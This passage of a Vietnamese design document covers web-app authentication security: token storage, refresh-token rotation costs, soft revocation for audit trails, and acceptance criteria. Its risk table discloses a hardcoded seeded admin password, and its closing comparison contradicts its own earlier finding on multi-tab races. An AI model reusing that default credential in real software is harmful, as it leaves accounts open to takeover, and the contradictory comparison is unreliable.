| 2 | **Không rate limiting** ở backend | Brute force vẫn có thể xảy ra | Thêm rate limiting middleware (ASP.NET Core) |
| 3 | **XSS vẫn có thể đọc RAM** qua memory dump hoặc debugger | Rất khó nhưng không impossible | next-auth chuyển sang HttpOnly cookie cho cả access token |
| 4 | **CSRF token là GUID đơn giản** | Có thể đoán được (xác suất thấp) | Dùng HMAC hoặc RandomNumberGenerator |
| 5 | **HSTS chỉ bật ở dev** (bug backend) | Prod không có HSTS | Sửa `SecureHeadersMiddleware.cs:40` |
| 6 | **Admin password hardcoded** trong RoleSeeder | "Admin@123" có trong source code | Chuyển vào config/environment |

### 8.5 Kết Luận

```
CURRENT (localStorage):           OPTION B (RAM + HttpOnly):
┌──────────────────────┐         ┌──────────────────────────┐
│  XSS Risk: 🚨 CAO    │         │  XSS Risk: ✅ THẤP       │
│  Auth Storage:  ❌   │    →    │  Auth Storage: ✅ ĐÚNG   │
│  Refresh Token: ❌   │         │  Refresh Token: ✅ HttpOnly│
│  Route Guard:   ❌   │         │  Route Guard:  ✅ Edge    │
│  CSP Headers:   ❌   │         │  CSP Headers:  ✅ Có     │
│  Auto Refresh:  ❌   │         │  Auto Refresh: ✅ Queue   │
└──────────────────────┘         └──────────────────────────┘
         │                               │
         ▼                               ▼
─────────────────────────────────────────────────────────────
  🚨 5/6 tiêu chí KHÔNG đạt      ✅ 6/6 tiêu chí ĐẠT
─────────────────────────────────────────────────────────────
```

---

## 9. Phân Tích Hiệu Suất Silent Refresh (Q&A)

### Câu hỏi

> "Mỗi lần user refresh trang → RAM mất → gọi refresh-token API → DB delete token cũ + insert token mới. Nếu nhiều user liên tục refresh, DB có bị quá tải không? UX có bị ảnh hưởng không?"

### 9.1 Chi phí DB cho mỗi lần refresh

```
POST /api/auth/refresh-token
  │
  ├── 1. SELECT RefreshToken WHERE Token = @token AND IsRevoked = false
  │      → Index seek trên cột Token, O(log n), ~1-2ms
  │
  ├── 2. UPDATE RefreshToken SET IsRevoked = true WHERE Id = @id
  │      → Row update (không thay đổi index), ~1-2ms
  │
  ├── 3. INSERT INTO RefreshToken (Id, UserId, Token, ExpiresAt, ...)
  │      → Append vào clustered index, ~1-2ms
  │
  ├── 4. UserManager.FindByIdAsync(userId)
  │      → SELECT AspNetUsers WHERE Id = @id, ~1-2ms
  │
  └── 5. Generate JWT + Set cookies
         → CPU-bound (HMAC-SHA256), ~2-5ms

  TỔNG: ~6-13ms DB time + ~2-5ms JWT generation
```

**Tổng thời gian xử lý 1 request refresh: ~10-20ms trên server** (chưa tính network latency).

### 9.2 Tính toán ở quy mô dự kiến

| Kịch bản | User | Refresh/ngày | DB writes/ngày | DB writes/giây |
|----------|------|-------------|---------------|---------------|
| MVP (hiện tại) | ~100 | ~5 lần/user | 500 | **~0.006** |
| Giai đoạn đầu | ~1,000 | ~5 lần/user | 5,000 | **~0.06** |
| Mở rộng | ~10,000 | ~5 lần/user | 50,000 | **~0.6** |
| Trưởng thành | ~100,000 | ~5 lần/user | 500,000 | **~6** |

So sánh với khả năng SQL Server:

| Chỉ số | SQL Server thường | SQL Server tối ưu |
|--------|------------------|-------------------|
| **Writes/giây tối đa** | ~10,000 | ~100,000+ |
| **DB writes của Option B (100k user)** | ~6/sec | ~6/sec |
| **% capacity sử dụng** | **0.06%** | **0.006%** |

→ **DB không phải là bottleneck.** Ngay cả ở 100,000 user, DB writes chỉ chiếm **0.06%** capacity.

### 9.3 Dung lượng bảng RefreshToken

| Mốc thời gian | Số rows (100k user) | Dung lượng ước tính |
|--------------|-------------------|-------------------|
| 1 ngày | 500,000 rows | ~100 MB |
| 1 tháng | 15,000,000 rows | ~3 GB |
| 1 năm | 180,000,000 rows | ~36 GB |

**Giải pháp cleanup (dễ dàng):**

```csharp
// Hangfire job chạy hàng ngày lúc 2h sáng
public class RefreshTokenCleanupJob
{
    public async Task CleanupExpiredTokens()
    {
        // Xóa token đã revoked > 30 ngày
        var cutoff = DateTime.UtcNow.AddDays(-30);
        await _dbContext.RefreshToken
            .Where(t => t.IsRevoked && t.CreatedAt < cutoff)
            .ExecuteDeleteAsync();
        
        // Xóa token đã hết hạn > 30 ngày
        await _dbContext.RefreshToken
            .Where(t => !t.IsRevoked && t.ExpiresAt < cutoff)
            .ExecuteDeleteAsync();
    }
}
```

→ Bảng luôn ở mức **~1-3 GB**, kể cả sau nhiều năm.

### 9.4 Tác động UX

```
Timeline khi user F5:
  ┌──────────────────────────────────────────────────────────┐
  │ 0ms    User F5 → Browser gửi request trang              │
  │ 100ms  Next.js render HTML (skeleton/loading)          │
  │ 200ms  useAuth() mount → detect token null              │
  │ 300ms  POST /refresh-token → BE xử lý (10-20ms)        │
  │ 400ms  FE nhận accessToken mới                           │
  │ 500ms  GET /auth/me → BE query DB (5-10ms)             │
  │ 600ms  FE nhận user profile → store.setUser()           │
  │ 650ms  Dashboard render → "Chào mừng, Tuan!"            │
  │         ↓                                                │
  │        User thấy UI hoàn chỉnh sau ~650ms                │
  └──────────────────────────────────────────────────────────┘
```

**Trong suốt thời gian này, user thấy skeleton loading (spinner/shimmer).**
Không có độ trễ bổ sung nào so với trang tĩnh — phần lớn thời gian là network latency, không phải DB.

**So sánh với Current (localStorage):**

```
Current (localStorage):
  User F5 → Load trang → localStorage.getItem('token') → token có
  → isAuthenticated = false (user = null, bug)
  → Dashboard hiển thị mock data với tên "Tuấn" hardcode

  ✅ Nhanh hơn (không gọi API)
  ❌ SAI — user data không chính xác, không thể gọi API thật

Option B (RAM + HttpOnly):
  User F5 → Load trang → silent refresh → fetch /me
  → isAuthenticated = true → Dashboard hiển thị tên user thật

  ✅ ĐÚNG — user data chính xác, có thể gọi API thật
  ⚠️ Chậm hơn ~500ms so với current (nhưng vẫn nhanh với skeleton)
```

### 9.5 Tối ưu nếu muốn giảm DB load

Option phụ — **chỉ rotate refresh token khi sắp hết hạn:**

```csharp
// TokenService.cs — không phải lúc nào cũng rotation
if (refreshToken.ExpiresAt > DateTime.UtcNow.AddDays(7))
{
    // Token còn hạn > 7 ngày → chỉ cấp access token mới, không thay refresh token
    var newAccessToken = GenerateAccessToken(user, roles);
    return Result.Success(new RefreshTokenResponse { 
        accessToken = newAccessToken, 
        expiredAt = ...
    });
}
else
{
    // Token sắp hết hạn → rotation: revoke cũ + cấp cặp mới
    return await FullRotationRefresh(refreshToken, user, roles);
}
```

**Tác động:**
- 90% số refresh không chạm vào DB (chỉ generate JWT)
- Chỉ 10% (khi token < 7 ngày) mới cần DB writes
- **Giảm DB load từ 0.6 writes/sec xuống ~0.06 writes/sec**
- **Đánh đổi:** Nếu refresh token bị đánh cắp, attacker có thể dùng trong 7 ngày (so với rotation mỗi lần là 0 ngày)

| Strategy | DB Writes | Security | Recommendation |
|----------|-----------|----------|---------------|
| **Rotation mỗi lần** | ~6/sec (100k users) | ✅ Tốt nhất | **Khuyến nghị — đơn giản, security-first** |
| **Rotation theo điều kiện** | ~0.06/sec | ⚠️ Trung bình | Chỉ khi thực sự cần thiết |

### 9.6 Tại sao dùng `IsRevoked = true` thay vì `DELETE`?

#### Câu hỏi

> "Sao không xóa hẳn refresh token khỏi DB? Nếu xóa thì nhẹ cho DB hơn (1 operation thay vì 2), và giảm dung lượng bảng."

#### So sánh chi phí

```
⊘ DELETE (xóa hẳn):
  1. DELETE FROM RefreshToken WHERE Token = @token
     → Tìm + xóa, ~1-3ms

✓ UPDATE IsRevoked = true (soft revoke):
  1. UPDATE RefreshToken SET IsRevoked = true WHERE Token = @token
     → Tìm + update, ~1-3ms
  2. INSERT INTO RefreshToken (...) VALUES (...)
     → Append token mới, ~1-2ms
     → Tổng: ~3-5ms
```

**⇒ Chi phí DB gần như tương đương.** DELETE không nhanh hơn đáng kể vì phần lớn thời gian là tìm row (index seek), thao tác xóa hay update chỉ khác nhau ~0.5ms.

#### Lý do thực sự: **Audit & An toàn dữ liệu**

Refresh token là **dữ liệu bảo mật quan trọng**, có 3 lý do chính không xóa:

##### Lý do 1: Phát hiện tấn công (Intrusion Detection)

```
Kịch bản:
  Attacker lấy được refresh token của user → gọi /refresh-token
  → BE tìm thấy token trong DB → IsRevoked = false → cho phép refresh
  → Set IsRevoked = true cho token cũ
  → Cấp token mới cho attacker

  Lúc này: USER CHÍNH CHỦ vẫn đang dùng app bình thường

  User chính chủ F5 → gọi /refresh-token với token CŨ của mình
  → BE tìm → IsRevoked = TRUE
  → REFUSED! → logout

NẾU DÙNG DELETE:
  Token cũ đã bị xóa → không thể biết token nào đã bị dùng
  → User chính chủ bị logout, không hiểu tại sao
  → KHÔNG THỂ phát hiện ai đã dùng token này

NẾU DÙNG IsRevoked:
  Token vẫn còn trong DB với flag revoked=true
  → Khi user chính chủ gặp lỗi, check DB thấy:
    "Token của mình đã bị revoke bởi request lúc 10:15:23
     nhưng mình không refresh lúc đó → CÓ THỂ BỊ TẤN CÔNG"
  → Có thể cảnh báo user: "Tài khoản của bạn có thể bị truy cập trái phép"
```

→ **IsRevoked là audit trail.** Nếu xóa, mất khả năng điều tra bảo mật.

##### Lý do 2: Audit trail cho race condition (multi-tab)

**Quan trọng: Cookie HttpOnly được chia sẻ giữa các tab trong cùng browser.** Khi Tab A nhận được `Set-Cookie: refreshToken=DEF`, cookie của Tab B cũng được cập nhật theo.

Dưới đây là phân tích cụ thể về race condition với 2 tab, **cả DELETE và IsRevoke đều xử lý tương tự nhau**, nhưng IsRevoke cho phép audit trail:

```
User có Tab A và Tab B, cùng mở app.

────── TRƯỜNG HỢP BÌNH THƯỜNG (không race) ──────

  Tab A mở trước → silent refresh
    → Gửi POST /refresh-token (cookie: refreshToken=ABC)
    → BE: revoke ABC → insert DEF → Set-Cookie: refreshToken=DEF
    → Tab A OK (access token mới)
    ↓
    Cookie của browser đã cập nhật thành DEF
    (CHO CẢ TAB A VÀ TAB B — cookie chia sẻ cùng domain)
    ↓
  Tab B mở sau (vài giây) → silent refresh
    → Gửi POST /refresh-token (cookie: refreshToken=DEF ← đã cập nhật!)
    → BE: tìm DEF → valid → revoke DEF → insert GHI → Set-Cookie: GHI
    → Tab B OK

  ✅ Cả 2 tab đều hoạt động bình thường.
  🔑 Cookie chia sẻ giữa các tab là chìa khóa.

────── TRƯỜNG HỢP RACE (cả 2 tab gửi request CÙNG LÚC) ──────

Thời gian:
  0ms    Tab A: POST /refresh-token (cookie: ABC)
  0ms    Tab B: POST /refresh-token (cookie: ABC)  ← CÙNG cookie ABC
         │
  5ms    BE xử lý request của Tab A trước:
         → SELECT WHERE Token='ABC' AND IsRevoked=false → FOUND
         → UPDATE IsRevoked=true (hoặc DELETE)
         → INSERT token DEF
         → Set-Cookie: refreshToken=DEF
         → Return 200 → Tab A OK
         │
  6ms    BE xử lý request của Tab B:
         → SELECT WHERE Token='ABC' AND IsRevoked=false
         → NOT FOUND (đã bị xóa/revoke bởi request Tab A)
         → Return 400
         → Tab B nhận lỗi
         │
  7ms    Cookie browser đã cập nhật thành DEF (từ response Tab A)
         │
  50ms   Tab B retry tự động (Axios queue):
         → Gửi POST /refresh-token (cookie: refreshToken=DEF ← đã cập nhật!)
         → BE: tìm DEF → valid → OK
         → Tab B OK sau 1 lần retry

  ✅ Cả 2 tab đều OK, Tab B chỉ bị chậm 1 lần retry (~50ms).
  ❌ Cả DELETE và IsRevoke đều xử lý tương tự → KHÔNG khác biệt!

────── SỰ KHÁC BIỆT DUY NHẤT: AUDIT TRAIL ──────

  DELETE:
    Token ABC biến mất khỏi DB.
    Không thể biết token ABC đã tồn tại ai dùng, lúc nào.

  IsRevoke:
    Token ABC vẫn còn trong DB: { Token='ABC', IsRevoked=true, CreatedAt=..., RevokedAt=... }
    Có thể query: "Token ABC bị revoke bởi request lúc 10:00:00.005
                   Và retry từ Tab B thành công lúc 10:00:00.055"
    → NẾU phát hiện ABC bị revoke lúc 10:00:00 NHƯNG user không refresh lúc đó
      → CÓ THẺ là tấn công → cảnh báo user.
```

> **Kết luận:** Với multi-tab, DELETE và IsRevoke hoạt động giống nhau — Tab B bị lỗi 1 lần rồi retry thành công. Điểm khác biệt là **audit trail**: IsRevoke giữ lại lịch sử để phát hiện tấn công, còn DELETE mất hết dấu vết.

##### Lý do 3: Debug & Support

```
Khi user báo lỗi "Tôi bị logout giữa chừng":
  Support kiểm tra DB:
  ┌─────────────────────────────────────────────┐
  │ SELECT * FROM RefreshToken                  │
  │ WHERE UserId = @userId                      │
  │ ORDER BY CreatedAt DESC                     │
  │                                             │
  │ Token A: Created=10:00, Revoked=false       │ ← Đang dùng
  │ Token B: Created=09:55, Revoked=true        │ ← Đã rotate
  │ Token C: Created=09:30, Revoked=true        │ ← Đã rotate
  │ Token D: Created=09:00, Revoked=true        │ ← Đã rotate
  └─────────────────────────────────────────────┘
  
  → Dễ dàng biết được lịch sử token
  → Biết lúc nào token bị revoke, bởi request nào

NẾU DÙNG DELETE:
  ┌─────────────────────────────────────────────┐
  │ SELECT * FROM RefreshToken                  │
  │ WHERE UserId = @userId                      │
  │                                             │
  │ Token A: Created=10:00, Revoked=false       │ ← Chỉ thấy 1 dòng
  │ → Không biết lịch sử                         │
  │ → Không biết token cũ có bị đánh cắp không   │
  └─────────────────────────────────────────────┘
```

#### Quy tắc trong Database Design

| Kiểu dữ liệu | Xóa vật lý? | Audit? | Ví dụ |
|-------------|------------|--------|-------|
| **Dữ liệu người dùng** (Transaction, Wallet...) | ✅ Soft delete (`deleted_at`) | ✅ Cần | Phục hồi nếu xóa nhầm |
| **Dữ liệu xác thực** (RefreshToken...) | ❌ Không xóa | ✅ `IsRevoked` | Audit trail bảo mật |
| **Dữ liệu log** (dung lượng lớn, ít giá trị) | ✅ DELETE dần | ❌ Không cần | Cleanup job |

**RefreshToken thuộc nhóm "dữ liệu xác thực"** — cần audit trail để phát hiện tấn công.

#### Quan trọng: DB load KHÔNG phải lý do

Trong cả DELETE và UPDATE IsRevoked, phần lớn thời gian là **tìm row (SELECT)** chứ không phải xóa/update:

```
Chi phí thực tế (các bước chính):
  ┌─────────────────────────────────────────────────────┐
  │ 1. SELECT ... WHERE Token = @token (Index Seek)     │ ~1ms
  │ 2. Hoặc DELETE hoặc UPDATE IsRevoked=true            │ ~0.5ms
  │ 3. INSERT token mới (append)                         │ ~1ms
  │                                                     │
  │ DELETE: 1 + 3 = ~2ms (tiết kiệm ~0.5ms)            │
  │ IsRevoked: 1 + 2 + 3 = ~2.5ms (thêm ~0.5ms)         │
  │                                                     │
  │ → KHÁC BIỆT KHÔNG ĐÁNG KỂ (~0.5ms)                 │
  │ → Vậy chọn IsRevoked vì audit, không phải perf      │
  └─────────────────────────────────────────────────────┘
```

#### Tổng kết

| So sánh | `DELETE` | `UPDATE IsRevoked = true` |
|---------|----------|---------------------------|
| **Hiệu năng** | ~2ms | ~2.5ms (chênh ~0.5ms) |
| **Phát hiện tấn công** | ❌ Không thể | ✅ Biết token nào bị dùng trái phép |
| **Race condition (multi-tab)** | ❌ Dễ bị logout nhầm | ✅ Xử lý được rotation an toàn |
| **Debug/Support** | ❌ Mất lịch sử | ✅ Có audit trail đầy đủ |
| **Dung lượng bảng** | ✅ Nhỏ (xóa hẳn) | ⚠️ Lớn hơn (nhưng cleanup job xóa dần) |

> **Kết luận:** `IsRevoked` được chọn vì **audit & security**, không phải vì hiệu năng. DELETE không nhanh hơn đáng kể (~0.5ms), trong khi `IsRevoked` mang lại khả năng phát hiện tấn công và debug không thể có được.

### 9.7 Kết luận

> **Với quy mô dự kiến của dự án, DB load từ refresh token rotation là KHÔNG ĐÁNG KỂ.**
>
> - 10,000 user: ~0.6 writes/giây → **0.006% capacity SQL Server**
> - 100,000 user: ~6 writes/giây → **0.06% capacity SQL Server**
> - UX: silent refresh mất ~500ms, user thấy skeleton loading
> - Bảo mật: token rotation là chuẩn industry (Auth0, NextAuth, Firebase Auth)
>
> **Không cần tối ưu ở giai đoạn này.** Nếu sau này scale >100k user, có thể thêm cleanup job + conditional rotation dễ dàng.

---

## 11. Cấu Trúc Thư Mục (cập nhật)

```
src/
├── app/
│   ├── (main)/dashboard/
│   │   └── page.tsx              ← [PENDING] Gắn auth profile
│   ├── layout.tsx                ← Giữ nguyên
│   ├── provider.tsx              ← [PENDING] Bỏ AuthProvider (nếu cần)
│   └── ...
│
├── features/
│   ├── auth/
│   │   ├── hooks/login/
│   │   │   ├── useLogin.ts       ← [PENDING] Type alignment
│   │   │   └── useLoginForm.ts   ← ✅ DONE Zustand + fix roles
│   │   └── ...
│   └── dashboard/
│       └── components/
│           └── WelcomeHero/
│               └── WelcomeHero.tsx ← [PENDING] Real user name
│
├── shared/
│   ├── api/
│   │   ├── generated/            ← SDK tự gen (giữ nguyên)
│   │   └── index.ts              ← ✅ DONE
│   │       • performRefresh()    ← Shared refresh (dòng 59-81)
│   │       • callRefreshApi()    ← axios riêng cho refresh (dòng 53-57)
│   │       • getRefreshEndpoint()
│   │       • Request interceptor ← Bearer + CSRF (dòng 89-110)
│   │       • Response interceptor ← 401 → performRefresh (dòng 116-133)
│   │       • Queue: failedQueue, isRefreshing, processQueue
│   ├── components/providers/
│   │   ├── AuthProvider/
│   │   │   └── auth-provider.tsx ← [PENDING] Compat layer gọi Zustand
│   │   └── index.ts             ← [PENDING] Update exports
│   ├── hooks/
│   │   └── useAuth.ts           ← ✅ DONE
│   │       • shared performRefresh()
│   │       • GET /me → mapUserFromMeResponse
│   │       • cancelled flag (cleanup)
│   └── stores/
│       └── auth-store.ts        ← ✅ DONE
│           • token, user, isAuthenticated (RAM)
│           • setToken, setUser, login, logout, setLoading, setRefreshing
│
├── middleware.ts                 ← [PENDING] Route guard
└── next.config.ts                ← [PENDING] CSP headers
```

---

## Acceptance Criteria (Definition of Done)

| Kịch bản | Hành vi mong đợi |
|----------|------------------|
| **Login thành công** | Token lưu RAM, user lưu Zustand, redirect `/dashboard`, hiển thị tên user thật |
| **Refresh page (F5)** | Silent refresh → gọi `/refresh-token` → lấy access token mới → gọi `/auth/me` → hydrate user |
| **Access token hết hạn (15p)** | API 401 → Axios auto refresh → retry → user không bị logout |
| **Refresh token hết hạn (30 ngày)** | Silent refresh fail → logout → redirect `/login` |
| **Đăng xuất** | Gọi `/logout` → revoke refresh token BE → clear store → redirect `/login` |
| **Truy cập `/dashboard` chưa login** | Middleware redirect `/login` |
| **Truy cập `/login` đã login** | Middleware redirect `/dashboard` |
| **CSRF protection** | POST/PUT/PATCH/DELETE có header `X-CSRF-TOKEN`, GET không có |
| **XSS mitigation** | Không token trong localStorage, CSP headers active (script-src 'self') |
